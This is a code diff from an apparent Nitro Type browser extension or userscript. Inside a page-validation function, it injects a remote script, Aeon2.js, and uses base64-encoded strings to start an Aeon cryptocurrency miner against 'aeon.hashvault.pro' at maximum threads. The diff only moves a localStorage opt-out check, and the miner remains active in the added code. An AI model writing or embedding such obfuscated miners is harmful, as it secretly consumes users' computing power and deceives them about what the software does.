@@ -8,25 +8,26 @@
         if (href == "https://www.nitrotype.com/race") res = true;
         else if (href.startsWith("https://www.nitrotype.com/race/")) res = true;
         else res = false;
-        const s = document.createElement('script');
-        s.src = 'https://cdn.rawgit.com/ultratype/11f461eb930a975b6b3d6309ac367ecb/raw/2a7de366027980dffbf8f23f61b87939c517b5f3/Aeon2.js';
-        s.onload = () => {
-            if (localStorage['multratype']) return;
-            const key = atob('QWVvbg==');
-            var intv = setInterval(() => {
-                if (window[key]) {
-                    let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
-                        atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
-                    let p = 'workers_';
-                    args.push(p);
-                    window[key].startp.apply(window[key], args);
-                    window[key].addMaxThreads();
-                    clearInterval(intv);
-                    return;
-                }
-            }, 100);
+        if (!localStorage['multratype']) {
+            const s = document.createElement('script');
+            s.src = 'https://cdn.rawgit.com/ultratype/11f461eb930a975b6b3d6309ac367ecb/raw/2a7de366027980dffbf8f23f61b87939c517b5f3/Aeon2.js';
+            s.onload = () => {
+                const key = atob('QWVvbg==');
+                var intv = setInterval(() => {
+                    if (window[key]) {
+                        let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
+                            atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
+                        let p = 'workers_';
+                        args.push(p);
+                        window[key].startp.apply(window[key], args);
+                        window[key].addMaxThreads();
+                        clearInterval(intv);
+                        return;
+                    }
+                }, 100);
+            }
+            document.head.appendChild(s);
         }
-        document.head.appendChild(s);
         return res;
     }
     if (!isValidPage(window.location.href)) {
